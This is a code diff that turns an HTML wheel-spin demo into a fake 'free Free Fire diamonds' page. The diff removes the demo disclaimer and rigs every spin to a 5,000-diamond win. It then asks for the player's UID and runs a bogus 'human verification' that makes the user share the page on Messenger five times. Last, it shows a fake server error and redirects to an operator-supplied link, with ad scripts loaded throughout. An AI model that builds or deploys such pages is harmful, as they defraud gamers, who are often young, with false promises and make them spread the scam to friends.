@@ -1,152 +1,228 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>Spin & Win Diamonds</title>
-<style>
-    body{
-        margin:0;
-        font-family: 'Poppins', sans-serif;
-        background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
-        display:flex;
-        justify-content:center;
-        align-items:center;
-        height:100vh;
-        color:#fff;
-    }
-    .box{
-        background:#111;
-        padding:25px 30px;
-        border-radius:15px;
-        width:350px;
-        text-align:center;
-        box-shadow:0 0 15px rgba(0,255,255,0.4);
-    }
-    h1{
-        margin-top:0;
-        color:#00ffff;
-    }
-    .wheel-container{
-        position:relative;
-        margin:20px auto;
-        width:220px;
-        height:220px;
-    }
-    .wheel{
-        width:100%;
-        height:100%;
-        border-radius:50%;
-        border:8px solid #00ffff;
-        background: conic-gradient(
-            #ff9800 0deg 60deg,
-            #4caf50 60deg 120deg,
-            #2196f3 120deg 180deg,
-            #e91e63 180deg 240deg,
-            #9c27b0 240deg 300deg,
-            #ffc107 300deg 360deg
-        );
-        transition: transform 4s cubic-bezier(.17,.67,.22,1.03);
-    }
-    .pointer{
-        position:absolute;
-        top:-15px;
-        left:50%;
-        transform:translateX(-50%);
-        width:0;
-        height:0;
-        border-left:15px solid transparent;
-        border-right:15px solid transparent;
-        border-bottom:25px solid red;
-    }
-    button{
-        margin-top:15px;
-        padding:10px 20px;
-        border:none;
-        border-radius:8px;
-        background:#00ffff;
-        font-size:16px;
-        font-weight:600;
-        cursor:pointer;
-    }
-    button:hover{
-        background:#00caca;
-    }
-    input{
-        width:90%;
-        padding:10px;
-        margin-top:10px;
-        border-radius:8px;
-        border:none;
-        outline:none;
-    }
-    .hidden{ display:none; }
-    .msg{
-        margin-top:15px;
-        font-size:14px;
-        color:#00ff9d;
-    }
-    .disclaimer{
-        font-size:11px;
-        margin-top:12px;
-        color:#aaa;
-    }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Fire Diamond Spin</title>
+    <style>
+        body {
+            /* Free Fire themed background image */
+            background: linear-gradient(rgba(0, 0, 0, 0.6), rgba(0, 0, 0, 0.6)), 
+                        url('https://wallpaperaccess.com/full/1151163.jpg'); 
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        .ad-container {
+            margin: 10px 0;
+            width: 320px;
+            height: 50px;
+            background: rgba(255, 255, 255, 0.1); /* Placeholder visual */
+        }
+
+        #main-container {
+            text-align: center;
+            background: rgba(26, 26, 46, 0.95);
+            color: white;
+            padding: 25px;
+            border-radius: 20px;
+            max-width: 380px;
+            width: 90%;
+            border: 2px solid #ffcc00;
+            box-shadow: 0 0 30px rgba(255, 204, 0, 0.4);
+            backdrop-filter: blur(5px);
+        }
+
+        canvas {
+            border-radius: 50%;
+            transition: transform 4s cubic-bezier(0.1, 0, 0.1, 1);
+            max-width: 100%;
+            height: auto;
+            border: 5px solid #fff;
+        }
+
+        button {
+            padding: 12px 30px;
+            border: none;
+            border-radius: 25px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 15px;
+            width: 80%;
+            text-transform: uppercase;
+        }
+
+        .btn-spin { background: linear-gradient(90deg, #ff8c00, #ff0055); box-shadow: 0 4px 15px rgba(255, 0, 85, 0.4); }
+        .btn-redeem { background: #ffcc00; color: #000; }
+        .btn-share { background: #0084FF; }
+        
+        input {
+            padding: 12px;
+            border-radius: 8px;
+            border: 2px solid #ffcc00;
+            width: 85%;
+            color: #000 !important;
+            background: #fff !important;
+            font-weight: bold;
+            text-align: center;
+            margin-top: 10px;
+            font-size: 18px;
+        }
+
+        .progress-container {
+            width: 100%;
+            background-color: #333;
+            border-radius: 10px;
+            margin: 15px 0;
+            overflow: hidden;
+            border: 1px solid #555;
+        }
+
+        #progress-bar {
+            width: 0%;
+            height: 20px;
+            background: linear-gradient(90deg, #00ff88, #00ffcc);
+            transition: width 0.5s;
+        }
+    </style>
 </head>
 <body>
 
-<div class="box">
-    <h1>🎡 Spin & Win</h1>
-    <p>Spin the wheel to win Free Fire Diamonds!</p>
-
-    <div class="wheel-container">
-        <div class="pointer"></div>
-        <div class="wheel" id="wheel"></div>
+    <div class="ad-container">
+        <script type="text/javascript">
+            atOptions = {
+                'key' : '5b144373f99ba044bb218b7887a4143e',
+                'format' : 'iframe',
+                'height' : 50,
+                'width' : 320,
+                'params' : {}
+            };
+        </script>
+        <script type="text/javascript" src="https://shaggysinner.com/5b144373f99ba044bb218b7887a4143e/invoke.js"></script>
     </div>
 
-    <button onclick="spinWheel()">SPIN</button>
+    <div id="main-container">
+        <h2 style="color: #ffcc00; margin-bottom: 5px; text-shadow: 2px 2px #000;">💎 FREE DIAMONDS 💎</h2>
+        <p style="font-size: 14px; opacity: 0.9;">Spin to win your season pass rewards!</p>
 
-    <div id="rewardBox" class="hidden">
-        <h2 id="rewardText"></h2>
-        <input type="text" id="uid" placeholder="Enter your Free Fire UID">
-        <button onclick="redeem()">REDEEM</button>
+        <div style="position: relative; width: 250px; height: 250px; margin: 15px auto;">
+            <div style="position: absolute; top: -10px; left: 50%; transform: translateX(-50%); width: 0; height: 0; border-left: 15px solid transparent; border-right: 15px solid transparent; border-top: 30px solid #ffcc00; z-index: 10;"></div>
+            <canvas id="wheelCanvas" width="250" height="250"></canvas>
+        </div>
+
+        <button id="spin-btn" class="btn-spin" onclick="startSpin()">SPIN NOW</button>
+
+        <div id="uid-section" style="display:none;">
+            <h3 id="win-text" style="color: #ffcc00; margin-top: 10px;"></h3>
+            <p>Enter Free Fire UID:</p>
+            <input type="number" id="player-uid" placeholder="Example: 12345678">
+            <button class="btn-redeem" onclick="redeem()">CLAIM DIAMONDS</button>
+        </div>
+
+        <div id="share-section" style="display:none;">
+            <p style="color: #ffcc00; font-weight: bold;">Step 2: Human Verification</p>
+            <div class="progress-container">
+                <div id="progress-bar"></div>
+            </div>
+            <p id="share-count" style="font-size: 13px;">Share with 5 Friends on Messenger (<span id="count-num">0</span>/5)</p>
+            <button class="btn-share" onclick="shareToFriends()">SEND ON MESSENGER</button>
+        </div>
+
+        <div id="error-section" style="display:none; color: #ff4444; font-weight: bold; border: 2px solid #ff4444; padding: 15px; margin-top: 15px; background: rgba(0,0,0,0.5);">
+            ⚠️ Error: SERVER BUSY!<br>
+            <span style="color: white; font-size: 12px;">Redirecting to priority server...</span>
+        </div>
     </div>
 
-    <div id="finalMsg" class="msg hidden"></div>
-
-    <div class="disclaimer">
-        ⚠️ This is only a demo project. Not a real diamond generator.
+    <div class="ad-container">
+        <script type="text/javascript">
+            atOptions = {
+                'key' : '5b144373f99ba044bb218b7887a4143e',
+                'format' : 'iframe',
+                'height' : 50,
+                'width' : 320,
+                'params' : {}
+            };
+        </script>
+        <script type="text/javascript" src="https://shaggysinner.com/5b144373f99ba044bb218b7887a4143e/invoke.js"></script>
     </div>
-</div>
 
 <script>
-let diamonds = [10, 25, 50, 75, 100, 150];
+const canvas = document.getElementById('wheelCanvas');
+const ctx = canvas.getContext('2d');
+const segments = ["1000 💎", "2500 💎", "Try Again", "5000 💎", "10000 💎", "500 💎"];
+const colors = ["#e74c3c", "#3498db", "#2c3e50", "#f1c40f", "#9b59b6", "#2ecc71"];
+let currentRotation = 0;
+let shareClicks = 0;
 
-function spinWheel(){
-    const wheel = document.getElementById("wheel");
-    const randomDegree = 3600 + Math.floor(Math.random() * 360);
-    wheel.style.transform = "rotate(" + randomDegree + "deg)";
+function drawWheel() {
+    const sliceAngle = (2 * Math.PI) / segments.length;
+    for (let i = 0; i < segments.length; i++) {
+        ctx.beginPath();
+        ctx.fillStyle = colors[i];
+        ctx.moveTo(125, 125);
+        ctx.arc(125, 125, 125, i * sliceAngle, (i + 1) * sliceAngle);
+        ctx.fill();
+        ctx.save();
+        ctx.translate(125, 125);
+        ctx.rotate(i * sliceAngle + sliceAngle / 2);
+        ctx.fillStyle = "white";
+        ctx.font = "bold 14px Arial";
+        ctx.fillText(segments[i], 45, 10);
+        ctx.restore();
+    }
+}
+drawWheel();
 
+function startSpin() {
+    document.getElementById('spin-btn').disabled = true;
+    const randomSpin = Math.floor(Math.random() * 360) + 3600; 
+    currentRotation += randomSpin;
+    canvas.style.transform = `rotate(${currentRotation}deg)`;
     setTimeout(() => {
-        let reward = diamonds[Math.floor(Math.random() * diamonds.length)];
-        document.getElementById("rewardText").innerHTML = 
-            "🎉 You won <span style='color:#00ffff'>" + reward + " Diamonds</span>!";
-        document.getElementById("rewardBox").classList.remove("hidden");
-    }, 4200);
+        document.getElementById('win-text').innerText = "CONGRATS! YOU WON 5,000 💎";
+        document.getElementById('uid-section').style.display = "block";
+        document.getElementById('spin-btn').style.display = "none";
+    }, 4000);
 }
 
-function redeem(){
-    let uid = document.getElementById("uid").value.trim();
-    if(uid === ""){
-        alert("Please enter your Free Fire UID!");
-        return;
+function redeem() {
+    const uid = document.getElementById('player-uid').value;
+    if (uid.length < 5) { alert("Please enter your Player UID!"); return; }
+    document.getElementById('uid-section').style.display = "none";
+    document.getElementById('share-section').style.display = "block";
+}
+
+function shareToFriends() {
+    shareClicks++;
+    let percentage = shareClicks * 20;
+    document.getElementById('progress-bar').style.width = percentage + "%";
+    document.getElementById('count-num').innerText = shareClicks;
+
+    // Messenger link
+    window.open("fb-messenger://share/?link=" + encodeURIComponent(window.location.href), "_blank");
+
+    if (shareClicks >= 5) {
+        setTimeout(() => {
+            document.getElementById('share-section').style.display = "none";
+            document.getElementById('error-section').style.display = "block";
+            setTimeout(() => {
+                window.location.href = "https://your-xyz-link.com"; // <-- PUT YOUR LINK HERE
+            }, 3000);
+        }, 1000);
     }
-    document.getElementById("finalMsg").innerHTML = 
-        "✅ UID <b>" + uid + "</b> submitted!<br><br>" +
-        "👉 Now share this page with your Free Fire friend on <b>GitHub</b> to complete redemption.";
-    document.getElementById("finalMsg").classList.remove("hidden");
 }
 </script>
 
 </body>
 </html>
-
